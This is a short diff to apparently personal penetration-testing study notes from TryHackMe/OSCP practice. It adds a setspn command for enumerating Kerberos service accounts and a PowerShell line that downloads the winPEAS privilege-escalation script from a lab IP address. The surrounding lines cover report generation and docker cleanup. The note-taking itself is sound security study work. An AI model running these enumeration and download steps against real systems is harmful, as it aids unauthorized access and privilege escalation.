@@ -60,6 +60,10 @@ dos2unix file
 - Permissions:
   - icalcs
 
+### Kerberos
+- Enumerate
+  - setspn -T medin -Q ​ */* = extract accounts from Service Principal Name
+
 
 ```
 docker exec 7b4294cce723 pandoc FOLDER/OSCP_Report_REPORT_THM.md \
@@ -93,3 +97,4 @@ docker exec 7b4294cce723 pandoc OSCP_Report_Steel_Mountail_THM.md \
   - docker system prune
 ```
 
+powershell -c Invoke-Webrequest -OutFile winPeas.bat http://10.9.1.255/winPEAS.ps1
